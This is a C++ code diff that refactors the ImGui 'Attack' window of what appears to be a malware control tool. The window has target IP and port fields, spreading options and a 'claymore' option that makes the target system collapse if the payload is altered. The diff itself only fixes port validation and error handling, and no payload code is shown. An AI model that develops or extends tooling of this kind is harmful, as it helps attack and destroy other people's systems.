@@ -2,6 +2,8 @@
 #include <iostream>
 #include <thread>
 #include <vector>
+#include <algorithm>
+#include <cctype>
 //imgui
 #include "imgui.h"
 #include "imgui_impl_glfw.h"
@@ -20,8 +22,8 @@ namespace Gui {
 
     }
     void AttackWindow::Render() {
-        ImGui::SetNextWindowPos(pos, ImGuiCond_FirstUseEver);
-        ImGui::SetNextWindowSize(size, ImGuiCond_FirstUseEver);
+        ImGui::SetNextWindowPos(pos, ImGuiCond_Always);
+        ImGui::SetNextWindowSize(size, ImGuiCond_Always);
         ImGui::Begin("Attack", &bool_attack_window, flags_attack_window);
 
         static std::vector<std::string> errors;
@@ -34,15 +36,6 @@ namespace Gui {
         ImGui::SetNextItemWidth(150); // Imposta la larghezza desiderata in pixel
         static char port_str[8] = "";
         ImGui::InputText("Target port", port_str, IM_ARRAYSIZE(port_str));
-        // Conversione sicura
-        int port = 0;
-        if (strlen(port_str) > 0 && std::all_of(port_str, port_str + strlen(port_str), ::isdigit)) {
-            port = std::stoi(port_str);
-            // Usa port come intero
-        } else {
-            errors.push_back("Invalid port number");
-        }
-
         // Checkbox
         static bool claymore_op = false;
         ImGui::Checkbox("Deploy claymore (if target tries to modify or edit the payload the system will collapse)", &claymore_op);
@@ -66,14 +59,25 @@ namespace Gui {
         // ImGui::ColorEdit4("Colore", color);
         ImGui::PushStyleVar(ImGuiStyleVar_FramePadding, ImVec2(20, 20));
         if (ImGui::Button("Attack")) {
+                        errors.clear();
             int err[8] = {0}; // Inizializza il vettore degli errori con tutti zeri
+                        int port = 0;
+
+                        if (strlen(port_str) == 0 || !std::all_of(port_str, port_str + strlen(port_str), [](unsigned char c){ return std::isdigit(c); })) {
+                                errors.push_back("Invalid port number");
+                        } else {
+                                port = std::stoi(port_str);
+                        }
+
             try
             {
-              attack(ip, port, attack_type, claymore_op, spread_op, network_spread_op, err);
+                            if (errors.empty()) {
+                                    attack(ip, port, attack_type, claymore_op, spread_op, network_spread_op, err);
+                            }
             }
-            catch(const std::string& e)
+                        catch(const std::exception& e)
             {
-              errors.push_back(e);
+              errors.push_back(e.what());
             }
         }
         ImGui::PopStyleVar();
